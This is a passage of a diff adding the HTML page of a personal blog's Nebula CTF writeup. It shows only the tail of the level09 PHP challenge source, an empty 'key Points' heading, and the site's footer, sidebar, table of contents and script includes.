class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, $contents);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> $contents;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$output = markup($argv[<span class="number">1</span>], $argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line"><span class="keyword">print</span> $output;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="key-Points-1"><a href="#key-Points-1" class="headerlink" title="key  Points"></a>key  Points</h3>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"><i class="fa fa-tag"></i> Pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/Writeup/RoutineTraining-Misc/" rel="next" title="Routine Training:Misc">
+                <i class="fa fa-chevron-left"></i> Routine Training:Misc
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Xu" />
+          <p class="site-author-name" itemprop="name">Xu</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/XuCcc" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/5743086152/profile?topnav=1&wvr=6&is_all=1" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nebula-Writeup-md"><span class="nav-text">Nebula Writeup.md</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level00"><span class="nav-text">level00</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeup"><span class="nav-text">Writeup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-01"><span class="nav-text">level 01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-1"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SourceCode"><span class="nav-text">SourceCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-1"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeup-1"><span class="nav-text">Writeup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level02"><span class="nav-text">level02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-2"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SourceCode-1"><span class="nav-text">SourceCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-2"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeups"><span class="nav-text">Writeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level03"><span class="nav-text">level03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-3"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SourceCode-2"><span class="nav-text">SourceCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-3"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeups-1"><span class="nav-text">Writeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level04"><span class="nav-text">level04</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-4"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SourceCode-3"><span class="nav-text">SourceCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-4"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeups-2"><span class="nav-text">Writeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level05"><span class="nav-text">level05</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-5"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-5"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeups-3"><span class="nav-text">Writeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level06"><span class="nav-text">level06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-6"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-6"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Witeups"><span class="nav-text">Witeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level07"><span class="nav-text">level07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-7"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SourceCode-4"><span class="nav-text">SourceCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Key-Points-7"><span class="nav-text">Key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeups-4"><span class="nav-text">Writeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level08"><span class="nav-text">level08</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#About-8"><span class="nav-text">About</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#key-Points"><span class="nav-text">key Points</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Writeups-5"><span class="nav-text">Writeups</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level09"><span class="nav-text">level09</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ABout"><span class="nav-text">ABout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SourceCode-5"><span class="nav-text">SourceCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#key-Points-1"><span class="nav-text">key  Points</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-hand-peace-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xu</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共2.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
